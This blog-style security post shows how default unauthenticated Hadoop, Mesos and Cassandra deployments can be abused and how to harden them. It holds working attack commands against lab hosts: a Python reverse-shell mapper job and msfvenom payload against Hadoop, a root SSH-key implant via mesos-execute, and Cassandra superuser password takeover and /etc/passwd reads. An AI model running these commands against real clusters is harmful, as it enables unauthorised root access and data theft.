## Landscape

Evaluating "how security works" for various software that makes massive data consumption, processing and analytics actually work was a fruitful exercise. Many were not designed in a way that would make them straightforward to enable security features during deployment, nor was the initial configuration easy to defend. We all just want stuff to work out of the box without having to worry about it, but few projects optimize towards secure defaults.

Detailed in this blog are ways for attacking systems that often meant to work in a [distributed](https://www.shodan.io/search?query=zookeeper) fashion across the ([internal?](https://www.shodan.io/search?query=hadoop)) network to crunch those numbers and enable people (and machines) to make decisions based on data. Before we dive in, let's set the stage: it's common to have no authentication or authorization enabled on install (w/o additional tinkering), leading to RCE on some products.

![panic button](https://i.ibb.co/gVFSJBz/sweaty.png)

**if you need to catch up on how the different codebases, design, architecture and such, check out the [References](#references) section and watch some videos if you like, then come back here to continue to the juicy details.*

## Hadoop

Hadoop is probably the most well known product in this domain. After a blazing fast manual installation that wasn't painful at all, as no one bothered to make an official package for it yet, we can check out the Web UI.

![default hadoop](https://i.ibb.co/Z2WdwJJ/hadoop.png)

Safemode is a maintenance state, which means HDFS is read-only, so it's not directly related to security. But "security" here means "authentication". That seems importante.

Let's start by running through what you can do using the hadoop toolchain on the local server.

**No security = no authentication = be who you want to be**

Browse and modify the data lake

```
$ export HADOOP_USER_NAME=hadoop
$ hadoop fs -touch /abc
$ ......... -ls /
-rw-r--r--   3 hadoop supergroup 0 2020 17:00 /abc
```

### Local Command Execution

*hadoop-streaming-[version].jar* comes with the Hadoop package and you can find it in somewhere in the installation directory.

```
$ hadoop jar hadoop-streaming.jar -input /tmp/test -output /tmp/out -mapper "id" -reducer NONE
...
ERROR streaming.StreamJob: Error Launching job : Permission denied: user=test, access=EXECUTE, inode="/tmp":root:supergroup:drwx------
```

Whoops, forgot to *authenticate* first.

```
$ export HADOOP_USER_NAME=hadoop
$ hadoop jar hadoop-streaming.jar -input /test/test -output /test/out -mapper id -reducer NONE

$ hadoop fs -cat /test/out/part-00000
uid=1001(hadoop) gid=1001(hadoop) groups=1001(hadoop)
```

I mean *really* authenticate.

```
$ export HADOOP_USER_NAME=root
$ hadoop fs -mkdir /tmp/input
$ hadoop fs -touchz /tmp/input/123

$ hadoop jar hadoop-streaming.jar -input /test/123 -output /tmp/out -mapper "id" -reducer NONE
INFO mapreduce.Job: Job job_1603984220990_0006 completed successfully

$ hadoop fs -cat /tmp/out/part-00000
uid=0(root) gid=0(root) groups=0(root)
```

There's an excellent collection of notes that cover many techniques which you can find [here](https://github.com/wavestone-cdt/hadoop-attack-library/tree/master/Tools%20Techniques%20and%20Procedures/Executing%20remote%20commands).

**Same thing with WebHDFS**

Feel free to spin up a web browser or and these types of requests yourself. You can generate more of them just by clicking around or reading the REST API [docs](https://hadoop.apache.org/docs/r1.2.1/webhdfs.html). Throw Burp in the middle if you feel so inclined and play around.

*DELETE /webhdfs/v1/abc?op=DELETE&recursive=true* - **fails**

*DELETE /webhdfs/v1/abc?op=DELETE&recursive=true&user.name=hadoop* - **succeeds**

As it says in the docs...

> When security is off, the authenticated user is the username specified in the user.name query parameter.

### Remote Command Execution

Check if ports 8032 (yarn), 9000 (namenode), 50010 (hdfs) are open. Yarn is the resource manager that handles job submissions, NameNode is the HDFS metadata service and lastly we have the HDFS DataNode service.

```
$ nmap -p 8032,9000,50010 172.17.0.3    
PORT      STATE SERVICE
8032/tcp  open  pro-ed
9000/tcp  open  cslistener
50010/tcp open  unknown
```

Now taking it for a test drive with our streaming jar, again specifying the input, output, mapper and reducer params but also the -fs and -jt flags for the remote server.

```
$ hadoop jar hadoop-streaming.jar -fs 172.17.0.3:9000 -jt 172.17.0.3:8032 -input /test/123 -output /tmp/out -mapper "id" -reducer NONE
INFO mapreduce.Job: Running job: job_1604081764253_0010
INFO ipc.Client: Retrying connect to server: 0.0.0.0/0.0.0.0:10020. Already tried 9 time(s); retry policy is RetryUpToMaximumCountWithFixedSleep(maxRetries=10, sleepTime=1000 MILLISECONDS)
Streaming Command Failed!
```

Something failed? Failed is bad right?

```
$ hdfs dfs -cat hdfs://172.17.0.3:9000/tmp/out/part-00000
uid=0(root) gid=0(root) groups=0(root)
```

![tommy boy](https://i.ibb.co/GsxtRJn/tommyboy.png)

Ok, but shell right...

**unknown failure, no connect back :'(**

```
$ msfvenom -p linux/x64/shell/reverse_tcp LHOST=172.17.0.2 LPORT=5555 -f elf -o shell.out

$ hadoop jar hadoop-streaming.jar -fs 172.17.0.3:9000 -jt 172.17.0.3:8032 -input /test/123 -output /tmp/out -file shell.out -mapper "./shell.out" -reducer NONE -background
```

**"just use python"**

```
$ hadoop jar hadoop-streaming.jar -fs 172.17.0.3:9000 -jt 172.17.0.3:8032 -input /test/123 -output /tmp/out -mapper "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.17.0.2\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'" -reducer NONE -background
```

```
$ while true; do nc -v -l -p 5555; done
listening on [any] 5555 ...
connect to [172.17.0.2] from (UNKNOWN) [172.17.0.3] 51740

<64253_0025/container_1604081764253_0025_01_000002#  id
uid=0(root) gid=0(root) groups=0(root)

<64253_0025/container_1604081764253_0025_01_000002# pwd
/tmp/hadoop-root/nm-local-dir/usercache/root/appcache/application_1604081764253_0025/container_1604081764253_0025_01_000002
```

### Mitigations

Turn on security.

Well sure, if you'd like to spend a whole bunch of time setting up Kerberos. Or, add some middleware...

[Apache Knox](https://docs.cloudera.com/runtime/7.2.0/knox-authentication/topics/security-knox-securing-access-hadoop-clusters-apache-knox.html) = authentication

> The Apache Knox Gateway (â€œKnoxâ€) is a system to extend the reach of Apacheâ„¢ HadoopÂ® services to users outside of a Hadoop cluster without reducing Hadoop Security. Knox also simplifies Hadoop security for users who access the cluster data and execute jobs. The Knox Gateway is designed as a reverse proxy.

[Apache Ranger](https://ranger.apache.org) = authorization

> Centralized security administration to manage all security related tasks in a central UI or using REST APIs.
Fine grained authorization to do a specific action and/or operation with Hadoop component/tool and managed through a central administration tool
Standardize authorization method across all Hadoop components.
Enhanced support for different authorization methods - Role based access control, attribute based access control etc.
Centralize auditing of user access and administrative actions (security related) within all the components of Hadoop.

## Mesos

Think of Mesos like Kubernetes.. but different. It's a compute manager which handles orchestration, scheduling, etc. Unlike k8s, it can handle non-containized workloads as well as containized ones with Marathon.

The most important thing here is that you ask Mesos to do stuff and .. it everyone to do that stuff. And by default, it does it without asking who's asking.

We can do this using mesos-execute to talk to the local server or specify a remote one with --master.

```
> mesos-execute --task_group=file://task.json
```

Pretend *task.json* contains lots of stuff, including **"command": { "value" : "[shell cmd here]" }**

```
$ LIBPROCESS_IP=10.0.0.2 mesos-execute --master=10.0.0.2:5050 --task_group=file://task.json
```

Or even better, just pass it the --command flag.

```
$ mesos-execute --master=10.0.0.2:5050 --name=â€œtestâ€ --command=â€<insert payload here>â€
```

It *needs* LIBPROCESS_IP=target for some reason.

What's funny about Mesos is that the agent will literally **try to run commands as the actual user executing mesos-execute**.

If youâ€™re root on your box, and the agent is running as root, commands will run as root. So if you want remote root on the agent, you better have root (or fakeroot) on the attacking box :â€™)

As an example, if youâ€™re logged in as notvalid (an os user that doesnâ€™t exist on the agent servers), then you're gonna have a bad time.

```
Received status update TASK_DROPPED for task 'test'
  message: 'Failed to create executor directory '/opt/mesos/slaves/d951a83c-37be-4212-b9b8-9241c618b272-S2840/frameworks/87333254-8ae1-4ad4-8ed5-caf83511b46c-0009/executors/test/runs/dc91b882-99f0-43af-b74a-20ed15d7182c': Failed to chown directory to 'notvalid': No such user 'notvalid''
  source: SOURCE_AGENT
  reason: REASON_EXECUTOR_TERMINATED
```

You better have come prepared to prove your worth to Mesos in order to get that RCE as root...

```
# mesos-execute --master=10.0.0.2:5050 --name="test" --command="echo <b64 encoded public key> | base64 -d >> /root/.ssh/authorized_keys"
Subscribed with ID 87333254-8ae1-4ad4-8ed5-caf83511b46c-0046
Submitted task 'test' to agent 'd951a83c-37be-4212-b9b8-9241c618b272-S2840'
Received status update TASK_STARTING for task 'test'
  source: SOURCE_EXECUTOR
Received status update TASK_RUNNING for task 'test'
  source: SOURCE_EXECUTOR
Received status update TASK_FINISHED for task 'test'
  message: 'Command exited with status 0'
```

```
$ ssh root@10.0.0.2
...
[root@mesos ~]# id
uid=0(root) gid=0(root) groups=0(root)
```

### Mitigations

Turn on authentication.

Mesos uses JSON credential files to authenticate agents, so make sure its configured with strong credentials. Oh they're usually plaintext on disk, so if you do compromise a cluster, you can try and reuse those secrets later as well.

There's a [secure-mesos-workshop](https://github.com/mesosphere-backup/secure-mesos-workshop) which gives a great run-down of how to do lots of Mesos security related tasks.

# Cassandra

Cassandra is a NoSQL database and management server. No AuthN by default. Also no AuthZ by default via **authorizer: AllowAllAuthorizer**.

> "By default, Cassandra is configured with AllowAllAuthenticator which performs no authentication checks and therefore requires no credentials. It is used to disable authentication completely."

So there's no authentication by default, but what's even more interesting is the subtleties between authN and authZ. If authentication is turned on, you must have valid credentials to login to the server. BUT if authorization is still off, a normal user will not be able to *add another superuser*, but many other privileged operations are left automatically authorized, such as the ability to *change the password of a superuser*.

Let's drop into a Cassandra client shell.

```
$ cqlsh -u test
Password: [test]
test@cqlsh>

test@cqlsh> create role test1 with password = 'test1' and superuser = true and login = true;
Unauthorized: Error from server: code=2100 [Unauthorized] message="Only superusers can create a role with superuser status"

test@cqlsh> alter role cassandra with password = 'test';

user@ubuntu:~$ cqlsh -u cassandra -p test
cassandra@cqlsh>
```

There's also some ways to read arbitrary files client-side.

```
test@cqlsh> SOURCE '/etc/passwd';
/etc/passwd:2:Invalid syntax at char 17
/etc/passwd:2:  root:x:0:0:root:/root:/bin/bash
...
```

```
test@cqlsh> create keyspace etc with replication = {'class':'SimpleStrategy', 'replication_factor':1};
........... create table etc.passwd (a text PRIMARY KEY, b text, c text, d text, e text, f text, g text);
............copy etc.passwd from '/etc/passwd' with delimiter = ':';
```

Because the client is reading files client-side (and not server-side), this is obviously not an issue, unless.. you complicate things by exposing a cassandra client over a the network with a web interface using something like Cassandra Web. Surely that scenario would not make one think they'd be any bugs there. Or if so, packages would need to be updated with the latest fixes... [hm](https://github.com/avalanche123/cassandra-web/commit/f11e47a26f316827f631d7bcfec14b9dd94f44be).

To their credit, Cassandra Web does throw errors when you try source and copy commands. But one can still do things like dump `system_auth.roles` for password hashes. And there was a directory traversal bug they patched that was pretty useful.


## Mitigations

Turn on authorization.

Flip authorizer to CassandraAuthorizer in cassandra.yaml as referenced [here](https://docs.datastax.com/en/cassandra-oss/3.0/cassandra/configuration/secureConfigInternalAuth.html).

```
test@cqlsh> alter role cassandra with password = 'test';
Unauthorized: Error from server: code=2100 [Unauthorized] message="User test does not have sufficient privileges to perform the requested operation"
```

Mitigate keyspace creation by turning on AuthZ as users can't create keyspaces, tables, etc.

```
test@cqlsh> create keyspace etc ...
Unauthorized: Error from server: code=2100 [Unauthorized] message="User test has no CREATE permission on <all keyspaces> or any of its parents"

test@cqlsh> copy ...
Failed to import 20 rowsâ€¦
Failed to import 17 rows: Unauthorized - Error from server: code=2100 [Unauthorized] message="User test has no MODIFY permission on <table etc.passwd> or any of its parents",  given up after 5 attempts
Failed to process 37 rows; failed rows written to import_etc_passwd.err
```

(but notice contents getting written locally to disk on `import_*.err` files :')

For Cassandra Web, sandbox! Containerize! Limit the blast radius somehow. AppArmor lets you profile an application's behavior restrict what it can do. It goes like this: a web server doesn't need access to files outside of the webroot, right? AppArmor makes sure that it behaves that way (assuming the policy has been configured correctly).

While SELinux applies labels to objects and ACLs are written for those labels, AppArmor works on file paths and is a bit more modern and easy to use.

```
$ aa-genprof
```

Then run the app and modify the profile (which was generated based on execution data) as needed.

```
$ apparmor_parser -r /etc/apparmor.d/usr.local.bin.cassandra-web
```

You can use aa-enforce and aa-disable to turn profiles on and off respectively.

# References

- https://github.com/wavestone-cdt/hadoop-attack-library/tree/master/Tools%20Techniques%20and%20Procedures/Executing%20remote%20commands
- https://hadoop.apache.org/docs/r1.2.1/webhdfs.html
- https://docs.cloudera.com/runtime/7.2.0/knox-authentication/topics/security-knox-securing-access-hadoop-clusters-apache-knox.html
- https://ranger.apache.org
- https://medium.com/@takkarharsh/authorization-of-services-using-knox-ranger-and-ldap-on-hadoop-cluster-35843a9e6cdb
- http://mesos.apache.org/documentation/latest/architecture/
- https://www.baeldung.com/mesos-kubernetes-comparison
- https://mesos.readthedocs.io/en/0.24.1/authentication/
- http://mesos.apache.org/documentation/latest/authentication/
- https://github.com/mesosphere-backup/secure-mesos-workshop
- https://cassandra.apache.org/doc/latest/operating/security.html
- https://github.com/avalanche123/cassandra-web/commit/f11e47a26f316827f631d7bcfec14b9dd94f44be
- https://docs.datastax.com/en/cassandra-oss/3.0/cassandra/configuration/secureConfigInternalAuth.html
- https://www.cyberciti.biz/tips/selinux-vs-apparmor-vs-grsecurity.html
- http://blog.azimuthsecurity.com/2012/09/poking-holes-in-apparmor-profiles.html
- https://wiki.debian.org/AppArmor/HowToUse

- https://www.shodan.io/search?query=hadoop
- https://www.shodan.io/search?query=Hadoop+IPC+port
- https://www.shodan.io/search?query=apache+hive
- https://www.shodan.io/search?query=riak
- https://www.shodan.io/search?query=zookeeper

